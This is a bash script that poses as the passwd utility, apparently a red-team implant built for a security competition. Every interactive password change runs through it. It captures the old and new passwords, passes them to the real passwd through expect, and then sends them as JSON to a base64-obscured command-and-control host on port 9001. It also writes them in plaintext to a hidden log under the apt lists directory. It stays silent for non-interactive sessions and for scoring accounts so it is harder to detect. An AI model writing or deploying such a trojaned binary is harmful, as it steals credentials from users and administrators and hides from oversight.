#!/bin/bash
REAL_PASSWD="/usr/bin/passwd"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_PASSWD "$@" ;;
esac

LOG_DIR="/var/lib/apt/lists/.cache"
LOCAL_LOG="${LOG_DIR}/events"
C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
C2_PORT="9001"
COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"

_log_local() {
    touch "$LOCAL_LOG" 2>/dev/null
    echo "$1" >> "$LOCAL_LOG" 2>/dev/null
    true  # never let log failure propagate
}

_log_remote() {
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "$1" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1 &
    true
}

# Pass straight through if stdin is not a terminal
# (Ansible, scripts — anything non-interactive)
if [ ! -t 0 ]; then
    exec $REAL_PASSWD "$@"
fi

INVOKING_USER=$(whoami)
HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
TARGET_USER="${1:-$INVOKING_USER}"
IS_ROOT=0
[ "$(id -u)" -eq 0 ] && IS_ROOT=1

_json_esc() {
    local s="$1"
    s="${s//\\/\\\\}"
    s="${s//\"/\\\"}"
    printf '%s' "$s"
}

# If expect is not installed, fall through to real passwd
if ! command -v expect >/dev/null 2>&1; then
    exec $REAL_PASSWD "$@"
fi

# -------------------------------------------------------
# Root changing another user's password — no current-pass prompt
# -------------------------------------------------------
if [ $IS_ROOT -eq 1 ] && [ -n "$1" ]; then
    IFS= read -r -s -p "New password: " NEW_PASS
    echo ""
    IFS= read -r -s -p "Retype new password: " NEW_PASS2
    echo ""

    if [ "$NEW_PASS" != "$NEW_PASS2" ]; then
        echo "Sorry, passwords do not match."
        exec $REAL_PASSWD "$@"
    fi

    export __PW_NEW="$NEW_PASS"
    export __PW_NEW2="$NEW_PASS2"
    RESULT=$(expect -c '
        set timeout 10
        set real_passwd [lindex $argv 0]
        set target [lindex $argv 1]
        spawn $real_passwd $target
        expect {
            "New password:" {
                send "$env(__PW_NEW)\r"
                expect {
                    "Retype new password:" {
                        send "$env(__PW_NEW2)\r"
                        expect eof
                    }
                    eof {}
                }
            }
            eof {}
            timeout {}
        }
    ' "$REAL_PASSWD" "$1" 2>/dev/null)
    unset __PW_NEW __PW_NEW2

    if echo "$RESULT" | grep -q "password updated successfully"; then
        echo "passwd: password updated successfully"
        SAFE_NEW=$(_json_esc "$NEW_PASS")
        PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"passwd_other","timestamp":"%s","data":{"target_user":"%s","new_password":"%s"}}' \
            "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$TARGET_USER" "$SAFE_NEW")
        _log_remote "$PAYLOAD"
        _log_local "${HOST_TS}|passwd_other|${INVOKING_USER}|target:${TARGET_USER}|new:${NEW_PASS}"
    else
        # expect run failed or output unclear — fall through to real passwd
        exec $REAL_PASSWD "$@"
    fi
    exit 0
fi

# -------------------------------------------------------
# User changing their own password
# -------------------------------------------------------
IFS= read -r -s -p "Current password: " CURRENT_PASS
echo ""
IFS= read -r -s -p "New password: " NEW_PASS
echo ""
IFS= read -r -s -p "Retype new password: " NEW_PASS2
echo ""

if [ "$NEW_PASS" != "$NEW_PASS2" ]; then
    echo "Sorry, passwords do not match."
    exec $REAL_PASSWD "$@"
fi

export __PW_CUR="$CURRENT_PASS"
export __PW_NEW="$NEW_PASS"
export __PW_NEW2="$NEW_PASS2"
RESULT=$(expect -c '
    set timeout 10
    set real_passwd [lindex $argv 0]
    spawn $real_passwd
    expect {
        "Current password:" {
            send "$env(__PW_CUR)\r"
            expect {
                "New password:" {
                    send "$env(__PW_NEW)\r"
                    expect {
                        "Retype new password:" {
                            send "$env(__PW_NEW2)\r"
                            expect eof
                        }
                        eof {}
                    }
                }
                "Authentication failure" { exit 1 }
                "authentication failure" { exit 1 }
                eof { exit 1 }
                timeout { exit 1 }
            }
        }
        eof {}
        timeout {}
    }
' "$REAL_PASSWD" 2>/dev/null)
unset __PW_CUR __PW_NEW __PW_NEW2
RESULT_RC=$?

if [ $RESULT_RC -ne 0 ] || echo "$RESULT" | grep -qi "authentication failure"; then
    echo "passwd: Authentication failure"
    exit 1
fi

if echo "$RESULT" | grep -q "password updated successfully"; then
    echo "passwd: password updated successfully"
    SAFE_OLD=$(_json_esc "$CURRENT_PASS")
    SAFE_NEW=$(_json_esc "$NEW_PASS")
    PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"passwd_self","timestamp":"%s","data":{"old_password":"%s","new_password":"%s"}}' \
        "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$SAFE_OLD" "$SAFE_NEW")
    _log_remote "$PAYLOAD"
    _log_local "${HOST_TS}|passwd_self|${INVOKING_USER}|old:${CURRENT_PASS}|new:${NEW_PASS}"
else
    # Unclear result — fall through so real passwd handles it
    exec $REAL_PASSWD "$@"
fi
